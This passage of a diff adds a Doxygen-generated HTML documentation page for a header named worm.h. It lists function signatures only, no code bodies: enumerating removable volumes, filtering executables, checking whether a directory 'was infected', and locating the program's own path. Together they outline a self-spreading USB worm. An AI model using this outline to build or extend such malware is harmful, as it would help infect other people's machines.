+<div class="ttc" id="aclassworm_html_aec72ce7fad91e6166b08b25c21947a6d"><div class="ttname"><a href="classworm.html#aec72ce7fad91e6166b08b25c21947a6d">worm::dir_was_infected</a></div><div class="ttdeci">bool dir_was_infected(const wstring &amp;dir_path)</div><div class="ttdef"><b>Definition</b> worm.cpp:580</div></div>
+<div class="ttc" id="aworm_8h_html_a0fa582bed0bb149e4824409e971a0d2c"><div class="ttname"><a href="worm_8h.html#a0fa582bed0bb149e4824409e971a0d2c">filter_only_exe</a></div><div class="ttdeci">void filter_only_exe(vector&lt; fs::path &gt; &amp;files)</div><div class="ttdef"><b>Definition</b> worm.cpp:206</div></div>
+<div class="ttc" id="aworm_8h_html_a139039a2dab4e82d2c66051b55e682c3"><div class="ttname"><a href="worm_8h.html#a139039a2dab4e82d2c66051b55e682c3">generate_unique_suffix</a></div><div class="ttdeci">wstring generate_unique_suffix()</div><div class="ttdef"><b>Definition</b> worm.cpp:77</div></div>
+<div class="ttc" id="aworm_8h_html_a2a9891e8465acd30739680ba674795b5"><div class="ttname"><a href="worm_8h.html#a2a9891e8465acd30739680ba674795b5">get_own_path</a></div><div class="ttdeci">std::wstring get_own_path()</div><div class="ttdef"><b>Definition</b> worm.cpp:18</div></div>
+<div class="ttc" id="aworm_8h_html_a30c54d8d378e04c33669ab521183c6e5"><div class="ttname"><a href="worm_8h.html#a30c54d8d378e04c33669ab521183c6e5">get_username</a></div><div class="ttdeci">wstring get_username()</div><div class="ttdef"><b>Definition</b> worm.cpp:169</div></div>
+<div class="ttc" id="aworm_8h_html_a51c4bcf05323f5477701fd1c737496f7"><div class="ttname"><a href="worm_8h.html#a51c4bcf05323f5477701fd1c737496f7">get_paths_for_volume</a></div><div class="ttdeci">vector&lt; wstring &gt; get_paths_for_volume(const wstring &amp;volumeName)</div><div class="ttdef"><b>Definition</b> worm.cpp:149</div></div>
+<div class="ttc" id="aworm_8h_html_a67e69358e6266c9bcc7569b491ad9b78"><div class="ttname"><a href="worm_8h.html#a67e69358e6266c9bcc7569b491ad9b78">get_own_folder</a></div><div class="ttdeci">std::wstring get_own_folder()</div><div class="ttdef"><b>Definition</b> worm.cpp:36</div></div>
+<div class="ttc" id="aworm_8h_html_a70ac3d6c53eea5921020cd31f94d8cd9"><div class="ttname"><a href="worm_8h.html#a70ac3d6c53eea5921020cd31f94d8cd9">is_hidden</a></div><div class="ttdeci">bool is_hidden(const fs::path &amp;path)</div><div class="ttdef"><b>Definition</b> worm.cpp:68</div></div>
+<div class="ttc" id="aworm_8h_html_a7f7d1574eb8de8b099ad44157c9d622f"><div class="ttname"><a href="worm_8h.html#a7f7d1574eb8de8b099ad44157c9d622f">get_drive_root_from_path</a></div><div class="ttdeci">std::wstring get_drive_root_from_path(const std::wstring &amp;full_path)</div><div class="ttdef"><b>Definition</b> worm.cpp:61</div></div>
+<div class="ttc" id="aworm_8h_html_a8d4c144a2215b68282c59e716c452811"><div class="ttname"><a href="worm_8h.html#a8d4c144a2215b68282c59e716c452811">get_removable_volume_paths</a></div><div class="ttdeci">vector&lt; wstring &gt; get_removable_volume_paths()</div><div class="ttdef"><b>Definition</b> worm.cpp:177</div></div>
+<div class="ttc" id="aworm_8h_html_ac4c5e45f63797a19094e21af2ffc622c"><div class="ttname"><a href="worm_8h.html#ac4c5e45f63797a19094e21af2ffc622c">attach_console</a></div><div class="ttdeci">void attach_console()</div><div class="ttdef"><b>Definition</b> worm.cpp:679</div></div>
+<div class="ttc" id="aworm_8h_html_ae2b9df655505f5f3c72e22468f277778"><div class="ttname"><a href="worm_8h.html#ae2b9df655505f5f3c72e22468f277778">get_all_volumes</a></div><div class="ttdeci">vector&lt; wstring &gt; get_all_volumes()</div><div class="ttdef"><b>Definition</b> worm.cpp:129</div></div>
+</div><!-- fragment --></div><!-- contents -->
+</div><!-- doc-content -->
+<!-- start footer part -->
+<div id="nav-path" class="navpath"><!-- id is needed for treeview function! -->
+  <ul>
+    <li class="navelem"><a class="el" href="dir_d44c64559bbebec7f509842c48db8b23.html">include</a></li><li class="navelem"><a class="el" href="worm_8h.html">worm.h</a></li>
+    <li class="footer">Создано системой <a href="https://www.doxygen.org/index.html"><img class="footer" src="doxygen.svg" width="104" height="31" alt="doxygen"/></a> 1.9.8 </li>
+  </ul>
+</div>
+</body>
+</html>
